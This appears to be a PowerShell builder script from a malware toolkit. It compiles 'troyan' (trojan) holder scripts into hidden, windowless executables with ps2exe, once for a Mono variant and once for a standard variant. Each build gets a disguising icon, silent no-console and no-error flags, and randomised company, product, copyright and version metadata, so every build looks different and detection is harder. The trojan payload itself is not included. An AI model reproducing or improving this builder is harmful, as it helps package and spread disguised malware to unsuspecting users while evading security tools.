param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName
Set-Location -Path $scriptDir

function Get-RandomString {
    -join ((97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
}

function Remove-FileIfExists {
    param ([string]$filePath)
    if (Test-Path $filePath) {
        Remove-Item $filePath
    }
}

function Get-RandomVersion {
    "$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random))"
}

if (-not (Test-Path -Path $server.userTroyanIco))
{
    Copy-Item -Path $server.defaultIco -Destination $server.troyanIco -Force
} else {
    Copy-Item -Path $server.userTroyanIco -Destination $server.troyanIco -Force
}

#### Mono

Remove-FileIfExists -filePath $server.troyanExeMono
Remove-FileIfExists -filePath $server.userTroyanExeMono

 #-requireAdmin
Invoke-ps2exe `
    -inputFile $server.troyanHolderMono `
    -outputFile $server.troyanExeMono `
    -iconFile $server.troyanIco `
    -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
    -company (Get-RandomString) `
    -product (Get-RandomString) `
    -title (Get-RandomString) `
    -copyright (Get-RandomString) `
    -trademark (Get-RandomString) `
    -version (Get-RandomVersion)

Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
Copy-Item -Path $server.troyanExeMono -Destination $server.userTroyanExeMono -Force


####

Remove-FileIfExists -filePath $server.troyanExe
Remove-FileIfExists -filePath $server.userTroyanExe

 #-requireAdmin
Invoke-ps2exe `
    -inputFile $server.troyanHolder `
    -outputFile $server.troyanExe `
    -iconFile $server.troyanIco `
    -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
    -company (Get-RandomString) `
    -product (Get-RandomString) `
    -title (Get-RandomString) `
    -copyright (Get-RandomString) `
    -trademark (Get-RandomString) `
    -version (Get-RandomVersion)

Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
Copy-Item -Path $server.troyanExe -Destination $server.userTroyanExe -Force


